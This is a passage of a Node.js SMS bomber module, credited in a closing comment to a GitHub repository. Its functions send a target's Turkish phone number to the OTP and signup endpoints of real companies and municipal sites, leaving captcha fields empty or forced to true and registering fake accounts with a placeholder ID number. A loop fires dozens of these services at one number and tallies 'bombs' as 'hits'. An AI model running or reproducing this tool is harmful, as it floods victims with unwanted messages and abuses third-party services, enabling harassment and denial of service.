name="SahisUyelik.Sifre"\r\n\r\nMemati31\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.SifreyiDogrula"\r\n\r\nMemati31\r\n------${boundary}\r\nContent-Disposition: form-data; name="recaptchaValid"\r\n\r\ntrue\r\n------${boundary}--\r\n`;
    request.post({
        url: "https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet",
        headers: {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": `multipart/form-data; boundary=----${boundary}`,
            "Origin": "null", "Dnt": "1", "Sec-Gpc": "1", "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers"
        },
        body: data,
        timeout: 6000,
        strictSSL: false
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Bayrampasa] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Bayrampasa] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 38. Money
async function Money(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    const p1 = no.slice(0, 3), p2 = no.slice(3, 10);
    request.post({
        url: "https://www.money.com.tr:443/Account/ValidateAndSendOTP",
        headers: {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
            "Accept": "*/*", "Referer": "https://www.money.com.tr/money-kartiniz-var-mi",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.money.com.tr"
        },
        form: { "phone": `${p1} ${p2}`, "GRecaptchaResponse": "" },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.resultType === 0) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Money] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Money] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 39. Alixavien
async function Alixavien(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://www.alixavien.com.tr:443/api/member/sendOtp",
        headers: {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
            "Accept": "*/*", "Content-Type": "application/json",
            "Origin": "https://www.alixavien.com.tr", "Referer": "https://www.alixavien.com.tr/UyeOl?srsltid=AfmBOoqrh4xzegqOPllnfc_4S0akofArgwZUErwoeOJzrqU16J1zksPj"
        },
        json: { "Phone": no, "XID": "" },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.isError === false) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Alixavien] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Alixavien] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 40. Jimmykey
async function Jimmykey(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: `https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm=${no}&gRecaptchaResponse=undefined`,
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.Sonuc === true) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Jimmykey] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Jimmykey] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 41. Ido
async function Ido(no, mail = faker.internet.email(), tc = "11111111111") {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://api.ido.com.tr:443/idows/v2/register",
        headers: {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
            "Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
            "Origin": "https://www.ido.com.tr", "Referer": "https://www.ido.com.tr/"
        },
        json: {
            "birthDate": true, "captcha": "", "checkPwd": "313131", "code": "",
            "day": 24, "email": mail, "emailNewsletter": false, "firstName": "MEMATI",
            "gender": "MALE", "lastName": "BAS", "mobileNumber": "0" + no,
            "month": 9, "pwd": "313131", "smsNewsletter": true,
            "tckn": tc, "termsOfUse": true, "year": 1977
        },
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Ido] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Ido] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

            async function send(no) {
                KahveDunyasi(no)
                Wmf(no)
                Bim(no)
                Englishhome(no)
                Suiste(no)
                KimGb(no)
                Evidea(no)
                Ucdortbes(no)
                TiklaGelsin(no)
                Naosstars(no)
                Koton(no)
                Hayatsu(no)
                Hizliecza(no)
                Metro(no)
                File(no)
                Akasya(no)
                Akbati(no)
                Komagene(no)
                Porty(no)
                Tasdelen(no)
                Uysal(no)
                Yapp(no)
                YilmazTicaret(no)
                Beefull(no)
                Dominos(no)
                Baydoner(no)
                Pidem(no)
                Frink(no)
                Bodrum(no)
                KofteciYusuf(no)
                Little(no)
                Orwi(no)
                Coffy(no)
                Hamidiye(no)
                Fatih(no)
                Sancaktepe(no)
                Bayrampasa(no)
                Money(no)
                Alixavien(no)
                Jimmykey(no)
                Ido(no)
            }

            for (let i = 0; i < amount; i++) {
                await send(phone);
                await delaySystem(1000);
            }

            async function systemFinished() {
                if (systemFinishedT == true) return;
                
                console.log('\n' + chalk.yellow('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
                console.log(chalk.green.bold('🏆 MISSION COMPLETED SUCCESSFULLY 🏆'));
                console.log(chalk.yellow('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
                console.log(chalk.cyan(`📊 Total Deployed: ${dataSb.total} bombs`));
                console.log(chalk.green(`✅ Successful: ${dataSb.success} hits`));
                console.log(chalk.red(`❌ Failed: ${dataSb.error} misses`));
                console.log(chalk.yellow(`🎯 Success Rate: ${((dataSb.success/dataSb.total)*100).toFixed(2)}%`));
                console.log(chalk.yellow('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'));
                
                const result = { status: true, dataSb };
                systemFinishedT = true;
                return resolve(result);
            }

            for (let i = 0; i < amount; i++) {
                await send(phone);
                await delaySystem(1000);
            }

        } catch (e) {
            console.error(chalk.red("💀 [CRITICAL ERROR] System failure:"), e);
            const result = { status: false, message: "Critical system error occurred." };
            reject(result);
        }
    });

    const result = await queryPromise;
    return result;
}

module.exports = smsBomber;


/*

https://github.com/egehan0250/Sms_Bomber_Api/blob/main/functions/sms.js adresinden alınmıştır.

*/
